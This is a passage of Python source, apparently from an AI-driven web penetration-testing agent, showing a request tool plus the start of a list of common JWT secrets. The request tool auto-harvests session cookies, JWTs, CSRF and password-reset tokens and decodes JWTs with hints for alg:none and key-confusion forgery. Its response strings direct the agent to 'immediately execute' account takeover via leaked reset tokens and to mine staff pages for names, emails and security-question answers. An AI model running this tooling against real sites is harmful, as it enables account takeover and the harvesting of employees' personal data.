    that's a blocking C-level call, it's also NOT interruptible by the
    console's cooperative SIGINT-based soft-cancel (_InterruptGuard in
    chat_ui.py) on the first Ctrl-C, which is exactly the "stuck for
    minutes, Ctrl-C does nothing" behavior this fixes.

    Running the call on a worker thread and bounding it with .result(
    timeout=hard_timeout) guarantees the CALLING thread (the orchestrator
    loop) gets control back within hard_timeout seconds no matter what —
    the worker thread may still be blocked and leak until the OS-level hang
    finally resolves on its own, but it's a daemon-pool thread, so it never
    keeps the process alive and never blocks the researcher's session
    again. Raises TimeoutError, which callers turn into a clean error dict
    instead of hanging.
    """
    future = _BOUNDED_REQUEST_POOL.submit(fn)
    try:
        return future.result(timeout=hard_timeout)
    except concurrent.futures.TimeoutError:
        raise TimeoutError(
            f"Network call did not complete within {hard_timeout}s (DNS resolution and/or connection appear "
            f"to be hanging rather than cleanly timing out/refusing — this is usually a firewalled, "
            f"sinkholed, or unresponsive host, not a slow-but-working one)."
        )


def _execute_curl(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    url = args.get("url") or target.name
    method = args.get("method", "GET").upper()
    custom_headers = normalize_headers(args.get("headers"))
    
    body = args.get("json") or args.get("body") or args.get("data")
    
    base = target.name if (target and target.name) else ""
    if not base.startswith(("http://", "https://")):
        base = f"https://{base}" if base else "https://localhost"
    parsed_base = urlparse(base)
    base_path = parsed_base.path.rstrip("/")

    if not url.startswith(("http://", "https://")):
        if url.startswith("/"):
            if base_path and not url.startswith(base_path + "/") and url != base_path:
                url = f"{base_path}{url}"
            url = f"{parsed_base.scheme}://{parsed_base.netloc}{url}"
        else:
            url = urljoin(base if base.endswith("/") else base + "/", url)
    else:
        # Auto-correct full URLs missing the target subpath scope
        parsed_url = urlparse(url)
        if parsed_base.netloc and parsed_url.netloc == parsed_base.netloc:
            if base_path and not parsed_url.path.startswith(base_path + "/") and parsed_url.path != base_path:
                new_path = f"{base_path}{parsed_url.path}"
                url = urlunparse((parsed_url.scheme, parsed_url.netloc, new_path, parsed_url.params, parsed_url.query, parsed_url.fragment))

    req_cookies = normalize_cookies(args.get("cookies") or args.get("cookie"))

    # If no Cookie header or cookies provided, auto-attach session cookies from target state if available
    if not req_cookies and not any(k.lower() == "cookie" for k in custom_headers.keys()) and hasattr(target, "state") and isinstance(target.state, dict):
        saved_cookies = normalize_cookies(target.state.get("cookies") or target.state.get("session_cookie"))
        if saved_cookies:
            req_cookies = saved_cookies

    # If auth header not provided, auto-attach from target state
    if not any(k.lower() == "authorization" for k in custom_headers.keys()) and hasattr(target, "state") and isinstance(target.state, dict):
        saved_token = target.state.get("auth_token") or target.state.get("forged_token")
        if saved_token:
            custom_headers["Authorization"] = f"Bearer {saved_token}"

    headers = merge_global_context({"global_headers": custom_headers})
    
    json_payload = None
    data_payload = None
    
    if args.get("json") is not None:
        json_payload = args.get("json")
    elif isinstance(body, dict):
        json_payload = body
    elif isinstance(body, str):
        body_str = body.strip()
        if (body_str.startswith("{") and body_str.endswith("}")) or (body_str.startswith("[") and body_str.endswith("]")):
            try:
                import json
                json_payload = json.loads(body_str)
            except Exception:
                data_payload = body
        else:
            data_payload = body

    has_content_type = any(k.lower() == "content-type" for k in headers.keys())
    if json_payload is not None and not has_content_type:
        headers["Content-Type"] = "application/json"
    elif data_payload is not None and not has_content_type:
        if "=" in str(data_payload) and "&" in str(data_payload) or ("=" in str(data_payload) and not "{" in str(data_payload)):
            headers["Content-Type"] = "application/x-www-form-urlencoded"

    # Auto-inject a CSRF token on mutating requests when the caller didn't
    # supply one explicitly. Many apps reject a state-changing request
    # without a valid anti-CSRF token even when the session cookie/auth
    # token is otherwise good -- without this the agent sees a bare 403 and
    # misreads it as an auth/permissions problem instead of a missing
    # token, or a login/form flow it just fetched silently fails to submit.
    CSRF_HEADER_NAMES = ("x-csrf-token", "x-xsrf-token", "csrf-token", "x-csrftoken")
    CSRF_FIELD_NAMES = ("_csrf", "csrf_token", "csrftoken", "authenticity_token", "__requestverificationtoken")
    if (
        method in ("POST", "PUT", "PATCH", "DELETE")
        and hasattr(target, "state") and isinstance(target.state, dict)
        and target.state.get("csrf_token")
        and not any(k.lower() in CSRF_HEADER_NAMES for k in headers.keys())
    ):
        saved_csrf = target.state["csrf_token"]
        saved_csrf_field = target.state.get("csrf_field_name")
        if json_payload is not None and isinstance(json_payload, dict):
            if saved_csrf_field and saved_csrf_field not in json_payload:
                json_payload[saved_csrf_field] = saved_csrf
            elif not any(k.lower() in CSRF_FIELD_NAMES for k in json_payload.keys()):
                json_payload["_csrf"] = saved_csrf
        elif data_payload is not None and isinstance(data_payload, str):
            field = saved_csrf_field or "_csrf"
            if f"{field}=" not in data_payload:
                data_payload = f"{data_payload}&{field}={saved_csrf}" if data_payload else f"{field}={saved_csrf}"
        # Also send it as a header -- many frameworks (Django, Express+csurf,
        # Rails/ASP.NET) accept it via header regardless of body placement,
        # and a framework that doesn't look for the header just ignores it.
        headers["X-CSRF-Token"] = saved_csrf

    try:
        if json_payload is not None:
            r = _bounded_request(lambda: requests.request(
                method=method,
                url=url,
                headers=headers,
                cookies=req_cookies or None,
                json=json_payload,
                timeout=10,
                verify=False,
                allow_redirects=False
            ))
        else:
            r = _bounded_request(lambda: requests.request(
                method=method,
                url=url,
                headers=headers,
                cookies=req_cookies or None,
                data=data_payload,
                timeout=10,
                verify=False,
                allow_redirects=False
            ))

        # ── Capture REAL, unedited proof of this exact request/response ──
        # This is what record_finding/export_report pull from later instead
        # of trusting the model to retype exact header/body values from
        # memory when it writes up a finding — that retyping is exactly how
        # a report ends up with a fabricated "session=abc123" / "example_value"
        # placeholder that was never actually observed on the wire. Capped
        # rolling log, newest-relevant-first when looked up.
        try:
            req_header_lines = "\n".join(f"{k}: {v}" for k, v in headers.items())
            req_cookie_str = ""
            if req_cookies:
                req_cookie_str = "; ".join(f"{ck}={cv}" for ck, cv in req_cookies.items()) if isinstance(req_cookies, dict) else str(req_cookies)
            req_body_preview = ""
            if json_payload is not None:
                req_body_preview = json.dumps(json_payload)
            elif data_payload is not None:
                req_body_preview = str(data_payload)[:1000]
            resp_header_lines = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            resp_body_preview = (r.text or "")[:2000]

            curl_repro = f'curl -s -X {method} "{url}"'
            for hk, hv in headers.items():
                curl_repro += f' -H "{hk}: {hv}"'
            if req_cookie_str:
                curl_repro += f' -b "{req_cookie_str}"'
            if req_body_preview:
                curl_repro += f" --data '{req_body_preview}'"

            raw_evidence = (
                f"$ {curl_repro}\n\n"
                f"HTTP/1.1 {r.status_code} {r.reason}\n{resp_header_lines}\n\n{resp_body_preview}"
            )

            if hasattr(target, "state") and isinstance(target.state, dict):
                evidence_log = target.state.setdefault("curl_evidence_log", [])
                evidence_log.append({
                    "url": url,
                    "method": method,
                    "origin_sent": headers.get("Origin") or custom_headers.get("Origin"),
                    "status": r.status_code,
                    "raw": raw_evidence,
                    "ts": datetime.now(timezone.utc).isoformat(),
                })
                # Rolling cap — keep the most recent 40 requests. A long
                # recon session shouldn't grow this unboundedly in target
                # state that gets persisted to disk every call.
                if len(evidence_log) > 40:
                    del evidence_log[: len(evidence_log) - 40]
        except Exception:
            pass  # evidence capture is best-effort and must never break the actual request

        # Store observed session cookies in target.state so subsequent tools (curl, gowitness, spider) can reuse them
        raw_set_cookie = r.headers.get("set-cookie") or r.headers.get("Set-Cookie")
        if (r.cookies or raw_set_cookie) and hasattr(target, "state") and isinstance(target.state, dict):
            if "cookies" not in target.state or not isinstance(target.state["cookies"], dict):
                target.state["cookies"] = {}
            if r.cookies:
                target.state["cookies"].update(r.cookies.get_dict())
                for ck, cv in r.cookies.get_dict().items():
                    if any(x in ck.lower() for x in ("sess", "token", "auth", "sid", "jwt", "id", "cookie", "key")):
                        target.state["session_cookie"] = f"{ck}={cv}"
                    if isinstance(cv, str) and cv.startswith("eyJ") and cv.count(".") >= 1:
                        target.state["auth_token"] = cv
                        if "headers" not in target.state or not isinstance(target.state["headers"], dict):
                            target.state["headers"] = {}
                        target.state["headers"]["Authorization"] = f"Bearer {cv}"
            if raw_set_cookie:
                for part in raw_set_cookie.split(";"):
                    if "=" in part:
                        k, v = part.strip().split("=", 1)
                        k_clean = k.strip()
                        v_clean = v.strip()
                        if k_clean.lower() not in ("path", "domain", "expires", "max-age", "samesite", "httponly", "secure"):
                            target.state["cookies"][k_clean] = v_clean
                            if any(x in k_clean.lower() for x in ("sess", "token", "auth", "sid", "jwt", "id", "cookie", "key")):
                                target.state["session_cookie"] = f"{k_clean}={v_clean}"
                            if v_clean.startswith("eyJ") and v_clean.count(".") >= 1:
                                target.state["auth_token"] = v_clean
                                if "headers" not in target.state or not isinstance(target.state["headers"], dict):
                                    target.state["headers"] = {}
                                target.state["headers"]["Authorization"] = f"Bearer {v_clean}"

        # Extract JWT / auth tokens / reset tokens from JSON response bodies (top-level and nested)
        if hasattr(target, "state") and isinstance(target.state, dict):
            try:
                resp_json = r.json()
                if isinstance(resp_json, (dict, list)):
                    flattened_json = _flatten_json_dict(resp_json)
                    for full_k, v in flattened_json.items():
                        if not v or not isinstance(v, (str, int)):
                            continue
                        val_str = str(v).strip()
                        if not val_str or len(val_str) < 3:
                            continue
                        leaf_k = full_k.split(".")[-1].split("[")[0].lower()
                        if leaf_k in ("token", "access_token", "jwt", "auth_token", "accesstoken", "authtoken", "id_token", "session_token", "reset_token", "token_id"):
                            target.state["auth_token"] = val_str
                            if "headers" not in target.state or not isinstance(target.state["headers"], dict):
                                target.state["headers"] = {}
                            target.state["headers"]["Authorization"] = f"Bearer {val_str}"
                            break
            except Exception:
                pass
            save_target(target)

        # Inspect and decode JWT if present
        jwt_candidate = None
        if hasattr(target, "state") and isinstance(target.state, dict) and target.state.get("auth_token"):
            auth_val = target.state.get("auth_token")
            if isinstance(auth_val, str) and auth_val.startswith("eyJ") and auth_val.count(".") >= 1:
                jwt_candidate = auth_val
        if not jwt_candidate and r.cookies:
            for cv in r.cookies.get_dict().values():
                if isinstance(cv, str) and cv.startswith("eyJ") and cv.count(".") >= 1:
                    jwt_candidate = cv
                    break
        if not jwt_candidate and r.text:
            jwt_m = re.search(r'eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]*', r.text)
            if jwt_m:
                jwt_candidate = jwt_m.group(0)

        jwt_info = None
        if jwt_candidate and isinstance(jwt_candidate, str) and jwt_candidate.startswith("eyJ") and jwt_candidate.count(".") >= 1:
            try:
                parts = jwt_candidate.split(".")
                def _b64dec(s: str) -> Dict[str, Any]:
                    s = s.replace("-", "+").replace("_", "/")
                    s += "=" * ((4 - len(s) % 4) % 4)
                    return json.loads(base64.b64decode(s).decode("utf-8", errors="ignore"))
                hdr = _b64dec(parts[0]) if len(parts) > 0 else {}
                pay = _b64dec(parts[1]) if len(parts) > 1 else {}
                if hdr and pay:
                    role_val = pay.get("role") or pay.get("roles") or pay.get("isAdmin") or pay.get("admin") or "user"
                    jwt_info = {
                        "token": jwt_candidate,
                        "header": hdr,
                        "payload": pay,
                        "role": role_val,
                        "alg": hdr.get("alg")
                    }
                    if str(role_val).lower() not in ("admin", "administrator", "root", "true"):
                        jwt_info["privilege_escalation_hint"] = "Non-admin JWT detected. Test algorithm confusion (alg:none / None), RS256->HS256 key confusion, claim manipulation (role/groups/sub/permissions), or JWKS header injection."
            except Exception:
                pass

        # Extract detected routes, script bundles, and authorization logic from response
        detected_scripts = set()
        detected_routes = set()
        detected_api_endpoints = set()
        auth_logic_snippets = []

        if r.text:
            # 1. Detect JavaScript bundle assets (<script src="...">, /assets/*.js, etc.)
            for m in re.findall(r'''(?:src|href)\s*=\s*[\"']([^\"' >]+\.js(?:\?[^\"' >]*)?)[\"']''', r.text, re.I):
                clean_script = m.split("?")[0]
                detected_scripts.add(clean_script)
            for m in re.findall(r'''['\"](/[a-zA-Z0-9_\-\.\/]+\.js)['\"]''', r.text):
                detected_scripts.add(m)

            # 2. Detect general paths and links
            for m in re.findall(r'''(?:href|action|path|url|to)\s*=\s*[\"'](/[^\"' >]+)[\"']''', r.text, re.I):
                if not any(m.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".woff", ".ico")):
                    detected_routes.add(m)
            for m in re.findall(r'''['\"](/[a-zA-Z0-9_\-\.\/]+)['\"]''', r.text):
                if len(m) > 1 and not m.startswith("//") and not any(m.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".woff", ".ico")):
                    if m.endswith(".js"):
                        detected_scripts.add(m)
                    else:
                        detected_routes.add(m)
            for m in re.findall(r'''(?:window\.__BASE__\s*\|\|\s*['\"]['\"])\s*\+\s*['\"](/[^\"']+)['\"]''', r.text):
                detected_routes.add(m)

            # 3. Detect API endpoints (/api/...) and authorization logic if response is JS or large text
            is_js_response = url.endswith(".js") or "javascript" in r.headers.get("Content-Type", "").lower()
            for api_match in re.findall(r'''['\"](/[a-zA-Z0-9_\-\.\/]*api[a-zA-Z0-9_\-\.\/]*)['\"]''', r.text):
                if len(api_match) > 4 and not any(api_match.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".woff", ".ico")):
                    detected_api_endpoints.add(api_match)

            if is_js_response or len(r.text) > 1000:
                for line in re.findall(r'''[^;{}]*(?:role|owner|admin|entitlement|permission|is_admin|metadata|console|billing)[^;{}]{0,100}''', r.text, re.I):
                    line_clean = line.strip().replace("\n", " ")
                    if 10 < len(line_clean) < 120 and any(kw in line_clean.lower() for kw in ("role", "owner", "admin", "entitlement", "permission", "is_admin")):
                        if line_clean not in auth_logic_snippets:
                            auth_logic_snippets.append(line_clean)

        clean_routes = []
        for cr in sorted(list(detected_routes)):
            if not any(cr.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".ico", ".woff", ".js")):
                clean_routes.append(cr)
        clean_routes = clean_routes[:35]

        # Register discovered endpoints into target state
        if hasattr(target, "state") and isinstance(target.state, dict):
            if "endpoints" not in target.state or not isinstance(target.state["endpoints"], list):
                target.state["endpoints"] = []
            for ep in list(clean_routes) + list(detected_api_endpoints):
                full_url = ep if ep.startswith("http") else f"https://{target.name}{ep}"
                if full_url not in target.state["endpoints"]:
                    target.state["endpoints"].append(full_url)
            save_target(target)

        # Clean HTML response body so styles/svgs don't crowd out the actual forms/content/comments
        body_text = r.text or ""
        is_html = "text/html" in r.headers.get("Content-Type", "").lower() or body_text.strip().startswith("<!doctype") or body_text.strip().startswith("<html")

        # Auto-capture a CSRF token from this response so a LATER mutating
        # request (a separate curl call) can present it automatically --
        # agents routinely fetch a form/page, then POST to it without
        # re-reading the hidden csrf field or meta tag themselves first.
        if is_html and r.text and hasattr(target, "state") and isinstance(target.state, dict):
            csrf_patterns = [
                (r'''<input[^>]+name=["\'](_csrf|csrf_token|csrftoken|authenticity_token|__RequestVerificationToken)["\'][^>]+value=["\']([^"\']+)["\']''', 1, 2),
                (r'''<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\'](_csrf|csrf_token|csrftoken|authenticity_token|__RequestVerificationToken)["\']''', 2, 1),
                (r'''<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']''', None, 1),
                (r'''<meta[^>]+content=["\']([^"\']+)["\'][^>]+name=["\']csrf-token["\']''', None, 1),
            ]
            for pattern, field_group, value_group in csrf_patterns:
                _m = re.search(pattern, r.text, re.I)
                if _m:
                    target.state["csrf_token"] = _m.group(value_group)
                    target.state["csrf_field_name"] = _m.group(field_group) if field_group else "csrf_token"
                    save_target(target)
                    break

        if is_html:
            # Strip large <style> and <svg> blocks to prevent cutting off forms, hints, and test accounts
            body_text = re.sub(r'<style\b[^>]*>[\s\S]*?</style>', '<!-- [CSS style block omitted for brevity] -->', body_text, flags=re.I)
            body_text = re.sub(r'<svg\b[^>]*>[\s\S]*?</svg>', '<!-- [SVG omitted] -->', body_text, flags=re.I)

        # Detect HTML comments
        html_comments = []
        if is_html:
            for c in re.findall(r'<!--([\s\S]*?)-->', r.text):
                c_str = c.strip()
                if c_str and not c_str.startswith("[") and len(c_str) < 500:
                    html_comments.append(c_str)

        resp_dict: Dict[str, Any] = {
            "url": url,
            "status_code": r.status_code,
            "headers": dict(r.headers),
            "cookies": r.cookies.get_dict(),
            "body_preview": body_text[:35000]
        }

        # Code-level detection of authentication leaks / sensitive parameters in payload
        detected_leaks = []
        try:
            rj = r.json()
            if isinstance(rj, (dict, list)):
                flat = _flatten_json_dict(rj)
                for fk, fv in flat.items():
                    leaf = fk.split(".")[-1].split("[")[0].lower()
                    if leaf in ("token", "reset_token", "reset_url", "reset_link", "password", "pass", "secret", "key", "api_key", "mfa_secret", "code", "otp", "preview"):
                        if fv and isinstance(fv, (str, int)) and str(fv).strip():
                            v_clean = str(fv).strip()
                            if v_clean.lower() not in ("true", "false", "null", "none", "undefined", "{}", "[]"):
                                detected_leaks.append(f"{fk} = '{v_clean}'")
        except Exception:
            pass

        # The check above only catches a token sitting under a dedicated
        # JSON key (e.g. "reset_token": "..."). It's blind to a token
        # embedded INSIDE a string value — e.g. a "message" field that
        # reads "...reset link: https://host/reset?token=abc123..." — the
        # single most common shape for a leaked password-reset token,
        # since APIs very often phrase it as a sentence/URL rather than a
        # bare field. Regex-scan the raw body text itself (not just JSON
        # key names) for token-bearing query params and standalone
        # long-random-looking tokens near reset/verify/confirm language,
        # so this reaches the model exactly like a key-based leak does.
        try:
            body_scan_text = r.text or ""
            if body_scan_text:
                for qp_match in re.finditer(
                    r'[?&](token|reset_token|reset_code|code|otp|verify_token|confirmation_token|t)=([A-Za-z0-9_\-\.]{8,})',
                    body_scan_text, re.I
                ):
                    val = qp_match.group(2)
                    entry = f"embedded_url_param.{qp_match.group(1)} = '{val}'"
                    if entry not in detected_leaks:
                        detected_leaks.append(entry)
                for kv_match in re.finditer(
                    r'''["']?(reset[_-]?token|reset[_-]?code|verification[_-]?code)["']?\s*[:=]\s*["']([A-Za-z0-9_\-\.]{8,})["']''',
                    body_scan_text, re.I
                ):
                    entry = f"embedded_text.{kv_match.group(1)} = '{kv_match.group(2)}'"
                    if entry not in detected_leaks:
                        detected_leaks.append(entry)
        except Exception:
            pass

        if detected_leaks:
            resp_dict["LEAK_ALERT"] = (
                f"CRITICAL DATA LEAK DETECTED IN RESPONSE BODY: "
                f"{len(detected_leaks)} sensitive parameter(s) exposed ({', '.join(detected_leaks[:5])}). "
                f"Do NOT report 'no leakage'. Analyze these parameters and immediately execute the next attack step (e.g. password reset / account takeover / token substitution)!"
            )

        # Code-level detection of authentication failures
        if method == "POST" and any(k in url.lower() for k in ("login", "auth", "signin", "session")):
            if any(err in r.text.lower() for err in ("invalid username or password", "invalid credentials", "incorrect password", "login failed", "authentication failed")):
                resp_dict["auth_status"] = "FAILED: Server returned an authentication failure message ('Invalid username or password'). This login attempt did NOT succeed."
            elif (r.status_code in (200, 302, 303) and (target.state.get("session_cookie") or target.state.get("auth_token"))):
                resp_dict["auth_status"] = "SUCCESSFUL LOGIN: Active session established."
                resp_dict["authenticated_recon_directive"] = (
                    "AUTHENTICATED SESSION ACQUIRED. Next actions: "
                    "1) Run 'spider' on the internal portal (e.g. url='https://.../portal') or systematically fetch all internal routes with 'curl'. "
                    "2) Thoroughly inspect all accessible internal staff, directory, user, and profile pages for leaked target personal information, bios, security question answers, or password reset flows."
                )
                # Remember exactly how this login was done -- url, method,
                # body, and the headers the caller explicitly supplied (not
                # the auto-injected cookie/CSRF ones, which get re-derived
                # fresh on replay) -- so a later dead-session detection can
                # automatically replay THIS SAME successful request instead
                # of the researcher/AI having to notice and redo it by hand.
                if hasattr(target, "state") and isinstance(target.state, dict):
                    try:
                        target.state["last_login_recipe"] = {
                            "url": url,
                            "method": method,
                            "json": json_payload,
                            "data": data_payload if json_payload is None else None,
                            "headers": dict(custom_headers),
                            "ts": time.time(),
                        }
                    except Exception:
                        pass

        # Session-death detection -- surface clearly when a request that
        # carried a stored session/auth token came back unauthenticated, so
        # the agent notices immediately instead of continuing to fuzz with a
        # dead session and misreading the resulting 401s/empty pages as
        # "not vulnerable" rather than "not logged in anymore".
        if hasattr(target, "state") and isinstance(target.state, dict) and (
            target.state.get("session_cookie") or target.state.get("auth_token") or target.state.get("cookies")
        ):
            session_dead = False
            reason = None
            if r.status_code in (401, 403):
                session_dead = True
                reason = f"HTTP {r.status_code}"
            elif r.status_code in (302, 303, 307, 308):
                loc = r.headers.get("Location", "")
                if re.search(r'(login|signin|sign-in|auth|session[-_]?expired)', loc, re.I):
                    session_dead = True
                    reason = f"redirected to '{loc}'"
            if not session_dead and r.text:
                body_lower = r.text[:3000].lower()
                if any(phrase in body_lower for phrase in (
                    "session has expired", "session expired", "please log in", "please sign in",
                    "not authenticated", "unauthenticated", "you must be logged in",
                    "login required", "authentication required", "token has expired",
                    "invalid or expired token", "please login to continue"
                )):
                    session_dead = True
                    reason = "logout/expiry language in response body"
            if session_dead:
                base_status_msg = (
                    f"SESSION LIKELY DEAD ({reason}) despite a stored session/auth token being sent on this "
                    f"request. Do not keep fuzzing with this session as if it's still valid -- a dead session "
                    f"produces 401/403 or empty results on EVERYTHING, which looks like 'not vulnerable' but "
                    f"actually means 'not logged in'."
                )
                recipe = target.state.get("last_login_recipe")
                last_attempt_raw = target.state.get("last_reauth_attempt_ts", 0) or 0
                # This crashed the whole curl call with "unsupported operand
                # type(s) for -: 'float' and 'str'" whenever
                # last_reauth_attempt_ts came back as anything but a plain
                # number (e.g. state round-tripped through a save/load path
                # that stringified it) -- a type hiccup on a cooldown timer
                # has no business aborting the request it's gating, so coerce
                # defensively and fall back to "no cooldown" rather than
                # raising.
                try:
                    last_attempt = float(last_attempt_raw)
                except (TypeError, ValueError):
                    last_attempt = 0.0
                # Short cooldown -- not to be polite to the target, but so a
                # tight fuzzing loop hitting a dead session on every single
                # request doesn't hammer the login endpoint once per request.
                # One real attempt per window is enough: it either fixes the
                # session for every request after it, or it doesn't and
                # retrying instantly on request #2 won't change that.
                cooldown_remaining = 30 - (time.time() - last_attempt)

                if not recipe:
                    resp_dict["session_status"] = (
                        f"{base_status_msg} No stored login recipe to auto re-login with yet (this session hasn't "
                        f"observed a successful POST login through curl). Re-run the login flow manually to get a "
                        f"fresh session, or treat this engagement thread as ended."
                    )
                elif cooldown_remaining > 0:
                    resp_dict["session_status"] = (
                        f"{base_status_msg} An auto re-login was already attempted recently "
                        f"(cooldown: {int(cooldown_remaining)}s remaining) -- not retrying again this request. If "
                        f"the session is still dead after the cooldown, the stored credentials themselves may no "
                        f"longer be valid."
                    )
                else:
                    target.state["last_reauth_attempt_ts"] = time.time()
                    save_target(target)
                    relogin_ok = False
                    relogin_error = None
                    try:
                        relogin_kwargs: Dict[str, Any] = dict(
                            method=recipe.get("method", "POST"),
                            url=recipe.get("url"),
                            headers=recipe.get("headers") or {},
                            timeout=10, verify=False, allow_redirects=False,
                        )
                        if recipe.get("json") is not None:
                            relogin_kwargs["json"] = recipe["json"]
                        elif recipe.get("data") is not None:
                            relogin_kwargs["data"] = recipe["data"]
                        r_relogin = _bounded_request(lambda: requests.request(**relogin_kwargs))
                        relogin_failed_phrase = any(
                            err in (r_relogin.text or "").lower()
                            for err in ("invalid username or password", "invalid credentials", "incorrect password", "login failed", "authentication failed")
                        )
                        if r_relogin.status_code in (200, 302, 303) and not relogin_failed_phrase:
                            raw_set_cookie2 = r_relogin.headers.get("set-cookie") or r_relogin.headers.get("Set-Cookie")
                            if r_relogin.cookies or raw_set_cookie2:
                                if "cookies" not in target.state or not isinstance(target.state["cookies"], dict):
                                    target.state["cookies"] = {}
                                if r_relogin.cookies:
                                    target.state["cookies"].update(r_relogin.cookies.get_dict())
                                    for ck, cv in r_relogin.cookies.get_dict().items():
                                        if any(x in ck.lower() for x in ("sess", "token", "auth", "sid", "jwt", "id", "cookie", "key")):
                                            target.state["session_cookie"] = f"{ck}={cv}"
                                if raw_set_cookie2:
                                    for part in raw_set_cookie2.split(";"):
                                        if "=" in part:
                                            k, v = part.strip().split("=", 1)
                                            k_clean, v_clean = k.strip(), v.strip()
                                            if k_clean.lower() not in ("path", "domain", "expires", "max-age", "samesite", "httponly", "secure"):
                                                target.state["cookies"][k_clean] = v_clean
                                                if any(x in k_clean.lower() for x in ("sess", "token", "auth", "sid", "jwt", "id", "cookie", "key")):
                                                    target.state["session_cookie"] = f"{k_clean}={v_clean}"
                                relogin_ok = True
                        if not relogin_ok:
                            relogin_error = (
                                "re-login was rejected (invalid credentials/login failed) -- the stored recipe's "
                                "credentials may no longer be valid"
                                if relogin_failed_phrase else
                                f"re-login attempt returned HTTP {r_relogin.status_code}"
                            )
                    except Exception as e:
                        relogin_error = f"re-login attempt raised {type(e).__name__}: {e}"

                    if relogin_ok:
                        save_target(target)
                        # Retry the ORIGINAL request once with the fresh
                        # session -- reported as separate retry_* fields
                        # rather than overwritten into status_code/body_preview,
                        # since everything already extracted above (leaks,
                        # JWT info, discovered routes) was computed from the
                        # DEAD response and would be misleading paired with a
                        # silently-swapped-in fresh body.
                        try:
                            fresh_cookies = normalize_cookies(target.state.get("cookies") or target.state.get("session_cookie"))
                            retry_headers = dict(headers)
                            fresh_token = target.state.get("auth_token")
                            if fresh_token:
                                retry_headers["Authorization"] = f"Bearer {fresh_token}"
                            if json_payload is not None:
                                r_retry = _bounded_request(lambda: requests.request(method=method, url=url, headers=retry_headers, cookies=fresh_cookies or None, json=json_payload, timeout=10, verify=False, allow_redirects=False))
                            else:
                                r_retry = _bounded_request(lambda: requests.request(method=method, url=url, headers=retry_headers, cookies=fresh_cookies or None, data=data_payload, timeout=10, verify=False, allow_redirects=False))
                            resp_dict["session_auto_relogged_in"] = True
                            resp_dict["retry_status_code"] = r_retry.status_code
                            resp_dict["retry_body_preview"] = (r_retry.text or "")[:35000]
                            resp_dict["session_status"] = (
                                f"{base_status_msg} Automatically replayed the last known-good login (recorded "
                                f"earlier this session) and got a fresh session, then retried this exact request "
                                f"once -- see 'retry_status_code'/'retry_body_preview' for that retry's result "
                                f"(status_code/body_preview above are still from the ORIGINAL dead-session "
                                f"request). If the retry still looks wrong, the target may need a completely "
                                f"fresh login (changed credentials/MFA), not just a session refresh."
                            )
                        except Exception as e:
                            resp_dict["session_auto_relogged_in"] = True
                            resp_dict["session_status"] = (
                                f"{base_status_msg} Auto re-login succeeded (fresh session now stored) but "
                                f"retrying this exact request failed ({type(e).__name__}: {e}) -- just re-issue "
                                f"the same request again now that the session's fresh."
                            )
                    else:
                        resp_dict["session_auto_relogged_in"] = False
                        resp_dict["session_status"] = (
                            f"{base_status_msg} Tried to auto re-login using the last known-good login recorded "
                            f"earlier this session, but {relogin_error or 'it did not produce a usable session'}. "
                            f"Re-run the login flow manually before continuing."
                        )

        if html_comments:
            resp_dict["discovered_html_comments"] = html_comments[:10]
        if jwt_info:
            resp_dict["jwt_info"] = jwt_info
        if detected_scripts:
            clean_scripts = sorted(list(detected_scripts))[:10]
            resp_dict["discovered_script_assets"] = clean_scripts
            resp_dict["methodology_hint"] = (
                f"CLIENT JAVASCRIPT DETECTED ({len(clean_scripts)} file(s)). "
                f"Do NOT guess API endpoints blind. Fetch referenced JavaScript bundle(s) with curl "
                f"to extract the exact client route table, API endpoints, and role/authorization logic."
            )
        if detected_api_endpoints:
            resp_dict["discovered_api_endpoints"] = sorted(list(detected_api_endpoints))[:25]
        if auth_logic_snippets:
            resp_dict["authorization_logic_snippets"] = auth_logic_snippets[:15]
        if clean_routes:
            resp_dict["detected_routes"] = clean_routes
            # Routes shaped like a newsroom/team/staff-directory page are the
            # single most common place a lab or real target leaks real staff
            # names/emails/usernames — exactly the kind of thing account
            # takeover objectives ("harvest an employee, then attack that
            # identity") depend on. Force this to the model's attention
            # instead of letting it get skipped in favor of guessing
            # credentials against generic/placeholder identifiers.
            content_leak_routes = [
                r for r in clean_routes
                if re.search(r'(blog|news|press|posts?|article|about|team|staff|author|people|newsroom)',
                             r, re.I)
            ]
            if content_leak_routes:
                resp_dict["content_recon_hint"] = (
                    f"ROUTE(S) LIKELY TO LEAK REAL STAFF IDENTITIES DETECTED: {content_leak_routes[:8]}. "
                    f"Fetch these with curl BEFORE testing any credentials — content/blog/team pages are "
                    f"the most common source of real employee names, emails, and usernames on a target. "
                    f"Any identifier you haven't personally observed in an actual tool result against this "
                    f"target is not real and must not be tested."
                )

        # 404 + this path's first segment has a singular/plural twin already
        # in this target's discovered endpoints -> near-certain wrong-path
        # guess, not a genuinely missing ID. This is real evidence from this
        # target's own history, not a generic reminder — much harder to
        # ignore than prompt wording, and it's what would have caught
        # /letters/<id> vs /letter/<id> on the very first 404, not the
        # eleventh.
        if resp_dict.get("status_code") == 404 and hasattr(target, "state") and isinstance(target.state, dict):
            try:
                req_segments = [s for s in urlparse(url).path.split("/") if s]
                if req_segments:
                    variants = set(_singular_plural_variants(req_segments[0]))
                    if variants:
                        for ep in target.state.get("endpoints", []):
                            ep_segments = [s for s in urlparse(ep).path.split("/") if s]
                            if ep_segments and ep_segments[0] in variants:
                                resp_dict["endpoint_mismatch_hint"] = (
                                    f"404 on path segment '{req_segments[0]}' — but '{ep_segments[0]}' (singular/"
                                    f"plural variant) already exists in THIS target's discovered endpoints, e.g. "
                                    f"'{ep}'. Before trying more IDs against '{req_segments[0]}', try this same ID "
                                    f"against '{ep_segments[0]}' instead. Several sequential 404s on the same path "
                                    f"segment is a signal you have the wrong path, not that the IDs don't exist."
                                )
                                break
            except Exception:
                pass

        return resp_dict
    except Exception as e:
        return {
            "url": url,
            "error": str(e)
        }


COMMON_JWT_SECRETS = (
    "secret", "Secret", "SECRET", "your-256-bit-secret", "your-secret-key", "secretkey",
